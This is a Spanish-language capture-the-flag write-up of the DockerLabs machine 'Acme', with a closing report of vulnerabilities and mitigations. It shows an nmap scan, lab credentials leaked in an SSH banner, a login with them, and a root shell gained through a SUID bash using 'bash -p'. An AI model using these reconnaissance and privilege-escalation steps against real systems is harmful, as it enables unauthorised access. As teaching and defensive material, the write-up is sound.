# Acme

> El banner del SSH filtra unas credenciales temporales en texto plano; con ellas accedo como 'usuario' y escalo a root abusando del bit SUID en /usr/bin/bash.

| | |
|---|---|
| **Plataforma** | DockerLabs |
| **Dificultad** | Muy fácil |
| **Objetivo** | `172.17.0.2` |
| **Servicios** | 22/tcp (SSH), 80/tcp (HTTP) |
| **Saltos de usuario** | 2 |

**Tags:** `SSH` · `Banner SSH` · `Credenciales filtradas` · `SUID` · `GTFOBins`

---

## Reconocimiento

```bash
$ sudo nmap -p- -sS -sV --min-rate 5000 -n -Pn --open 172.17.0.2
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.16
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
```

La web del 80 es un portal de ACME Corporation 'en mantenimiento' que menciona que la administración se hace por SSH. Esa es la pista: el servidor SSH muestra un banner y conviene leerlo.

## Credenciales en el banner SSH

Un banner SSH es el mensaje que el servidor envía a cualquier cliente antes de pedir la contraseña. Suele usarse para avisos legales, pero aquí está mal configurado y filtra credenciales. Me conecto con cualquier nombre de usuario (da igual, el banner sale antes de autenticar).

```bash
$ ssh usuario@172.17.0.2
===================================================================
[*] ACME Corporation - Nodo Bastion de Mantenimiento Interno
[!] Credenciales temporales asignadas para tareas de mantenimiento:
[!]   - Usuario: usuario
[!]   - Password: P@ssw0rd2026_CTF!
===================================================================
usuario@172.17.0.2's password:
```

El banner revela **usuario : P@ssw0rd2026_CTF!**, sin necesidad de autenticarse ni de tocar la web.

## Acceso por SSH

```bash
$ ssh usuario@172.17.0.2
usuario@172.17.0.2's password: (P@ssw0rd2026_CTF!)
Welcome to Ubuntu 22.04.5 LTS
-bash-5.1$ whoami
usuario
```

## Escalada a root · SUID

usuario no tiene permisos de sudo, así que busco binarios con el bit SUID activado.

```bash
$ find / -perm -4000 -ls 2>/dev/null
... /usr/bin/mount /usr/bin/su /usr/bin/passwd /usr/bin/sudo ...
/usr/bin/dash
/usr/bin/bash   <-- shell con SUID: abusable
```

> **Nota.** Tanto `bash` como `dash` tienen SUID de root. El flag `-p` le dice a la shell que no descarte el EUID heredado: como el binario es SUID de root, la shell resultante corre como root (GTFOBins).

```bash
$ /usr/bin/bash -p
bash-5.1# whoami
root
```

Máquina Acme completada: `uid=0(root)`.

---

## Informe · vulnerabilidades y mitigaciones

### 🔴 CRÍTICA — Escalada a root por bit SUID en /usr/bin/bash

`CWE-250` · A05:2021 – Security Misconfiguration

**Impacto.** bash tiene el bit SUID de root: ejecutarlo con -p conserva los privilegios y da una shell root directa.

**Mitigación.** Quitar el SUID (chmod u-s /usr/bin/bash) y auditar periódicamente los binarios con SUID.

### 🟠 ALTA — Credenciales filtradas en el banner SSH

`CWE-200` · A05:2021 – Security Misconfiguration

**Impacto.** El servidor muestra en el banner de bienvenida del SSH, antes de autenticarse, un usuario y una contraseña válidos en texto plano a cualquiera que se conecte.

**Mitigación.** No incluir secretos en los banners (reservarlos para avisos legales) y entregar las credenciales por un canal seguro.

---

_Writeup de **Acme** · DockerLabs · por [ak1t4](https://github.com/ak1ta4)_
